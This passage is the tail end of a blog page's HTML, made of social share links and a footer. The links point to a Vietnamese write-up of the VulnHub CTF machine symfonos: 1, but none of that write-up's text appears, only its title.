423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution%2f&title=VulnHub%20CTF%20-%20symfonos%3a%201%20-%20V%e1%ba%abn%20l%c3%a0%20m%e1%bb%99t%20v%c3%a0i%20plugin%20c%e1%bb%a7a%20Wordpress%2c%20c%e1%ba%a9n%20th%e1%ba%adn%20khi%20s%e1%bb%ad%20d%e1%bb%a5ng%20plugin%20b%c3%aan%20Wordpress%20-%20SMTP%20-%20T%e1%bb%ab%20LFI%20cho%20%c4%91%e1%ba%bfn%20Remote%20Code%20Excecution"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution on whatsapp" href="https://api.whatsapp.com/send?text=VulnHub%20CTF%20-%20symfonos%3a%201%20-%20V%e1%ba%abn%20l%c3%a0%20m%e1%bb%99t%20v%c3%a0i%20plugin%20c%e1%bb%a7a%20Wordpress%2c%20c%e1%ba%a9n%20th%e1%ba%adn%20khi%20s%e1%bb%ad%20d%e1%bb%a5ng%20plugin%20b%c3%aan%20Wordpress%20-%20SMTP%20-%20T%e1%bb%ab%20LFI%20cho%20%c4%91%e1%ba%bfn%20Remote%20Code%20Excecution%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - symfonos: 1 - Vẫn là một vài plugin của Wordpress, cẩn thận khi sử dụng plugin bên Wordpress - SMTP - Từ LFI cho đến Remote Code Excecution on telegram" href="https://telegram.me/share/url?text=VulnHub%20CTF%20-%20symfonos%3a%201%20-%20V%e1%ba%abn%20l%c3%a0%20m%e1%bb%99t%20v%c3%a0i%20plugin%20c%e1%bb%a7a%20Wordpress%2c%20c%e1%ba%a9n%20th%e1%ba%adn%20khi%20s%e1%bb%ad%20d%e1%bb%a5ng%20plugin%20b%c3%aan%20Wordpress%20-%20SMTP%20-%20T%e1%bb%ab%20LFI%20cho%20%c4%91%e1%ba%bfn%20Remote%20Code%20Excecution&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>